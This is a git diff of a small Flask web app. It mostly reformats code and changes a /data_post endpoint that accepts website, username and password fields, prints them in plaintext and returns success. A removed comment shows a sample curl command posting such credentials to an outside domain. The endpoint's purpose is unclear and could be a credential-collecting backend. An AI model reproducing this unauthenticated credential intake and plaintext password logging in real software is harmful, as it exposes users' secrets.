@@ -1,28 +1,32 @@
 from dotenv import load_dotenv, find_dotenv
 import os
 from flask import Flask, render_template, request
+
 load_dotenv(find_dotenv())
 
 app = Flask(__name__)
+
 
 @app.route("/")
 def home():
     return render_template("home.html")
 
+
 @app.route("/data_post", methods=["POST"])
 def data_post():
-    # pull the following data from body:
-    website = request.form["website"]
-    username = request.form["username"]
-    password = request.form["password"]
-    print(website, username, password)
-    return "ok"
-    # Handle saving data
-    # curl -X POST -H "Content-Type: application/json" -d '{ "website": "test.com", "username": "i0dev", "password": "123" }' http://twitterbecauseitsavailablenow.tech/data_post  
+    if request.method == "POST":
+        # pull the following data from body:
+        website = request.form["website"]
+        username = request.form["username"]
+        password = request.form["password"]
+        print(website, username, password)
+        return '{"success": true}'
 
-@app.route('/about')
+
+@app.route("/about")
 def about():
-    return render_template('about.html')
+    return render_template("about.html")
+
 
 if __name__ == "__main__":
     port = os.environ.get("PORT")
